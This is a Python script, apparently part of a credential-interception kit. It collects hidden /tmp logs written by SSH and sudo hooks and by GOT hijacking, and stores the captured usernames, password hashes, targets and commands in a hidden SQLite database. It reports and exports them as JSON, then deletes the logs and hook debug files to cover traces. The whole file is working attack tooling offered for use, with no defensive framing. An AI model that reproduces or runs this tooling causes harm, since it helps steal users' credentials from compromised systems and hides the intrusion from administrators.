#!/usr/bin/env python3
"""
Credential Logger and Analysis Tool
Processes and analyzes captured credentials from various sources
"""

import os
import sys
import json
import time
from datetime import datetime
from pathlib import Path
import sqlite3
import hashlib

class CredentialLogger:
    def __init__(self, db_path="/tmp/.creds.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize SQLite database for credential storage"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                source TEXT NOT NULL,
                username TEXT,
                password_hash TEXT,
                target TEXT,
                pid INTEGER,
                command TEXT,
                raw_entry TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                start_time TEXT NOT NULL,
                end_time TEXT,
                session_type TEXT NOT NULL,
                total_creds INTEGER DEFAULT 0
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def hash_password(self, password):
        """Create SHA-256 hash of password for storage"""
        if not password or password in ["unknown", "[hidden]", "[execvp]", "[execve]"]:
            return password
        return hashlib.sha256(password.encode()).hexdigest()[:16]
    
    def parse_log_entry(self, line):
        """Parse a single log entry"""
        line = line.strip()
        if not line:
            return None
        
        try:
            if line.startswith('[') and '] ' in line:
                timestamp_end = line.find('] ') + 2
                timestamp = line[1:timestamp_end-2]
                content = line[timestamp_end:]
                
                if ':' in content:
                    source_type = content.split(':')[0].strip()
                    data_part = content.split(':', 1)[1].strip()
                    
                    cred_data = {
                        'timestamp': timestamp,
                        'source': source_type,
                        'username': 'unknown',
                        'password': 'unknown',
                        'target': 'unknown',
                        'pid': 0,
                        'command': '',
                        'raw_entry': line
                    }
                    
                    for part in data_part.split(', '):
                        if '=' in part:
                            key, value = part.split('=', 1)
                            key = key.strip()
                            value = value.strip()
                            
                            if key in cred_data:
                                if key == 'pid':
                                    try:
                                        cred_data[key] = int(value)
                                    except ValueError:
                                        cred_data[key] = 0
                                else:
                                    cred_data[key] = value
                    
                    return cred_data
        except Exception as e:
            print(f"Error parsing line: {line[:50]}... - {e}")
        
        return None
    
    def process_log_file(self, log_file_path):
        """Process a single log file and add entries to database"""
        if not os.path.exists(log_file_path):
            print(f"Log file not found: {log_file_path}")
            return 0
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        processed = 0
        
        try:
            with open(log_file_path, 'r') as f:
                for line in f:
                    cred_data = self.parse_log_entry(line)
                    if cred_data:
                        password_hash = self.hash_password(cred_data['password'])
                        
                        cursor.execute('''
                            INSERT INTO credentials 
                            (timestamp, source, username, password_hash, target, pid, command, raw_entry)
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                        ''', (
                            cred_data['timestamp'],
                            cred_data['source'],
                            cred_data['username'],
                            password_hash,
                            cred_data['target'],
                            cred_data['pid'],
                            cred_data['command'],
                            cred_data['raw_entry']
                        ))
                        processed += 1
        
        except Exception as e:
            print(f"Error processing {log_file_path}: {e}")
        
        conn.commit()
        conn.close()
        return processed
    
    def collect_all_logs(self):
        """Collect and process all credential logs"""
        log_files = [
            "/tmp/.ssh_creds.log",
            "/tmp/.sudo_creds.log", 
            "/tmp/.got_hijack.log",
            "/tmp/.credentials.log",
            "/tmp/.system_loader.log"
        ]
        
        total_processed = 0
        for log_file in log_files:
            if os.path.exists(log_file):
                count = self.process_log_file(log_file)
                print(f"Processed {count} entries from {log_file}")
                total_processed += count
        
        return total_processed
    
    def generate_report(self):
        """Generate analysis report"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        print("\n" + "="*60)
        print("CREDENTIAL INTERCEPTION ANALYSIS REPORT")
        print("="*60)
        
        cursor.execute("SELECT COUNT(*) FROM credentials")
        total_creds = cursor.fetchone()[0]
        print(f"Total credentials captured: {total_creds}")
        
        cursor.execute("SELECT source, COUNT(*) FROM credentials GROUP BY source")
        sources = cursor.fetchall()
        print("\nBy source:")
        for source, count in sources:
            print(f"  {source}: {count}")
        
        cursor.execute("SELECT username, COUNT(*) FROM credentials GROUP BY username")
        users = cursor.fetchall()
        print("\nBy user:")
        for user, count in users:
            print(f"  {user}: {count}")
        
        cursor.execute("SELECT target, COUNT(*) FROM credentials WHERE target != 'unknown' GROUP BY target")
        targets = cursor.fetchall()
        print("\nTargets:")
        for target, count in targets:
            print(f"  {target}: {count}")
        
        cursor.execute('''
            SELECT timestamp, source, username, target 
            FROM credentials 
            ORDER BY timestamp DESC 
            LIMIT 10
        ''')
        recent = cursor.fetchall()
        
        print("\nRecent activity:")
        for timestamp, source, username, target in recent:
            print(f"  {timestamp}: {source} - {username}@{target}")
        
        conn.close()
    
    def export_json(self, output_file):
        """Export data to JSON"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT timestamp, source, username, target, pid, command
            FROM credentials
            ORDER BY timestamp DESC
        ''')
        
        data = []
        for row in cursor.fetchall():
            data.append({
                'timestamp': row[0],
                'source': row[1], 
                'username': row[2],
                'target': row[3],
                'pid': row[4],
                'command': row[5]
            })
        
        with open(output_file, 'w') as f:
            json.dump(data, f, indent=2)
        
        conn.close()
        print(f"Data exported to {output_file}")
    
    def cleanup_logs(self):
        """Remove temporary log files"""
        log_files = [
            "/tmp/.ssh_creds.log",
            "/tmp/.sudo_creds.log",
            "/tmp/.got_hijack.log", 
            "/tmp/.credentials.log",
            "/tmp/.system_loader.log",
            "/tmp/.ssh_hook_debug.log",
            "/tmp/.sudo_hook_debug.log"
        ]
        
        cleaned = 0
        for log_file in log_files:
            if os.path.exists(log_file):
                try:
                    os.remove(log_file)
                    cleaned += 1
                except Exception as e:
                    print(f"Failed to remove {log_file}: {e}")
        
        print(f"Cleaned up {cleaned} log files")

def main():
    logger = CredentialLogger()
    
    if len(sys.argv) < 2:
        print("Usage: python3 credential_logger.py <command>")
        print("Commands:")
        print("  collect    - Collect and process all logs")
        print("  report     - Generate analysis report") 
        print("  export <file> - Export data to JSON")
        print("  cleanup    - Remove temporary log files")
        sys.exit(1)
    
    command = sys.argv[1]
    
    if command == "collect":
        count = logger.collect_all_logs()
        print(f"Total processed: {count} credentials")
    
    elif command == "report":
        logger.generate_report()
    
    elif command == "export" and len(sys.argv) > 2:
        logger.export_json(sys.argv[2])
    
    elif command == "cleanup":
        logger.cleanup_logs()
    
    else:
        print(f"Unknown command: {command}")

if __name__ == "__main__":
    main()